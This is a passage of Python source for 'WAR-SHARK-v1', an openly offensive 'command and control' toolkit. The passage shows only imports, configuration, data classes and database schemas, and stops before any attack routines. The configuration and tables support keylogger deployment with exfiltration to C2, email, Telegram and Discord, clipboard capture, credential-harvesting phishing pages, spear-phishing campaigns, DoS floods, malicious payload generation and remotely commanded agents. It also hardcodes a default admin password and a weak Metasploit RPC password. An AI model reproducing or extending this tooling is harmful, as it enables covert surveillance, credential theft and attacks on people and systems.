#!/usr/bin/env python3
"""
🦈 WAR-SHARK-v1 - Ultimate Cybersecurity Command & Control Platform
Author: Ian Carter Kulani
Version: 1.0.0
Description: Complete cybersecurity toolkit with multi-platform bots, advanced social engineering,
             keylogger deployment, real-time monitoring..
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import csv
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO
from datetime import datetime, timedelta

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "WAR-SHARK-v1"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"
LINES_OF_CODE = 10000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp
try:
    import pywhatkit
    WHATSAPP_AVAILABLE = True
except ImportError:
    WHATSAPP_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# THEME (Blue & White with Cyberpunk Accents)
# =====================
class Colors:
    PRIMARY = '\033[94m'      # Blue
    SECONDARY = '\033[96m'    # Cyan
    ACCENT = '\033[97m'       # White
    SUCCESS = '\033[92m'      # Green
    WARNING = '\033[93m'      # Yellow
    ERROR = '\033[91m'        # Red
    INFO = '\033[94m'         # Blue
    DARK = '\033[90m'         # Dark Gray
    WHITE = '\033[97m'        # White
    BLUE = '\033[94m'         # Blue
    CYAN = '\033[96m'         # Cyan
    RED = '\033[91m'          # Red
    GREEN = '\033[92m'        # Green
    MAGENTA = '\033[95m'      # Magenta
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BG_BLUE = '\033[44m'
    BG_WHITE = '\033[47m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".war_shark"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "war_shark.db")
LOG_FILE = os.path.join(CONFIG_DIR, "war_shark.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "war_shark_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
REVERSE_ENG_DIR = os.path.join(CONFIG_DIR, "reverse_engineering")
METASPLOIT_DIR = os.path.join(CONFIG_DIR, "metasploit")
POST_EXPLOIT_DIR = os.path.join(CONFIG_DIR, "post_exploitation")
EXPLOIT_DB_DIR = os.path.join(CONFIG_DIR, "exploit_db")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, DOCKER_SCANS_DIR, CRACKING_DIR, WORDLISTS_DIR,
    REVERSE_ENG_DIR, METASPLOIT_DIR, POST_EXPLOIT_DIR, EXPLOIT_DB_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WAR-SHARK - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("WarShark")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_duration": 30
        },
        "agent": {
            "enabled": False,
            "server": "localhost",
            "port": 5555,
            "heartbeat": 60
        },
        "payload": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "exe_icon": "",
            "docx_template": "default"
        },
        "reporting": {
            "enabled": True,
            "pdf_enabled": True,
            "json_enabled": True,
            "auto_generate": True
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "hashcat",
            "wordlist_path": os.path.join(WORDLISTS_DIR, "rockyou.txt"),
            "default_hash_type": 0,
            "max_threads": 4
        },
        "metasploit": {
            "enabled": True,
            "rpc_host": "127.0.0.1",
            "rpc_port": 55552,
            "rpc_user": "msf",
            "rpc_pass": "password"
        },
        "reverse_engineering": {
            "enabled": True,
            "ghidra_path": "",
            "radare2_path": "radare2",
            "objdump_path": "objdump"
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )""",
            """CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1,
                scan_data TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )""",
            """CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )""",
            """CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )""",
            """CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )""",
            """CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS metasploit_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                target_host TEXT,
                target_port INTEGER,
                exploit_module TEXT,
                payload_module TEXT,
                status TEXT DEFAULT 'active',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_activity DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS reverse_engineering_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                binary_path TEXT NOT NULL,
                analysis_type TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                completed_at DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS exploit_modules (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT,
                description TEXT,
                author TEXT,
                rank TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )"""
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            default_password = "warshark2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: DomainHost) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
